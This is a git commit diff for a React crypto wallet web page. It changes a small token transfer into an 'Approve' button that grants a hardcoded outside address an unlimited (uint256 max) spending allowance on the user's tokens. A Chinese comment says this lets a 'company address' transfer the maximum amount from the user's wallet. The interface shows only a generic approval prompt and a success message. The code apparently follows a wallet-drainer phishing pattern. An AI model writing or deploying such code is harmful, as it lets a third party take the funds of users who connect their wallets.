bddb95917099bd774e97371dd0f8392ccc7b0911
kui <105092010+kuiwang2022@users.noreply.github.com>
2025-03-08 20:59:41 +0800

    feat: approve

--- src/App.tsx
+++ src/App.tsx
@@ -3,42 +3,37 @@ import { getImageUrl } from "./utils";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount } from "wagmi";
 import { useWriteContract } from "wagmi";
-import { parseUnits } from "viem";
 import erc20ABI from "./assets/abi/erc20.json";
 import { message } from "antd";
 
 const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const toAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-const bigNumberAmount = parseUnits("0.1", 6);
+const toAddress = "0xe3BAC5233DFfbAee9249Db7Ff913081ED27679aA";
+const uint256Max = BigInt(2) ** BigInt(256) - BigInt(1);
 
 function App() {
   const { address } = useAccount();
   const { writeContractAsync } = useWriteContract();
 
-  const transfer = async () => {
+  const approveMaxAmount = async () => {
     try {
-      console.log(address, bigNumberAmount, "address");
+      console.log(address, "用户地址");
+      console.log(uint256Max, "最大授权数量");
+
+      // 授权公司地址可以从用户钱包转移最大数量的代币
       const approveHash = await writeContractAsync({
         abi: erc20ABI,
         address: tokenAddress,
         functionName: "approve",
-        args: [toAddress, bigNumberAmount],
+        args: [toAddress, uint256Max],
       });
+
       console.log(approveHash, "approveHash");
       if (approveHash) {
-        const txHash = await writeContractAsync({
-          abi: erc20ABI,
-          address: tokenAddress,
-          functionName: "transfer",
-          args: [toAddress, bigNumberAmount],
-        });
-        if (txHash) {
-          message.success("Transfer success");
-        }
+        message.success("Authorization successful!");
       }
     } catch (error) {
       console.log(error, "error");
-      message.error("Except for the problem, please try again");
+      message.error("There was a problem during the authorization process, please try again");
     }
   };
 
@@ -56,13 +51,13 @@ function App() {
 
       <div className="container mx-auto flex-1 flex flex-col lg:flex-row items-center">
         <div className="flex-1 space-y-4">
-          <h1 className="text-[#ffffff] text-[64px] font-semibold">Transfer you token</h1>
+          <h1 className="text-[#ffffff] text-[64px] font-semibold">Approve you token</h1>
           {address ? (
             <button
               className="w-[178px] h-[48px] bg-[#5580F9] cursor-pointer text-[18px] rounded-[48px] font-semibold text-white hover:opacity-80"
-              onClick={transfer}
+              onClick={approveMaxAmount}
             >
-              Transfer
+              Approve
             </button>
           ) : (
             <ConnectButton />
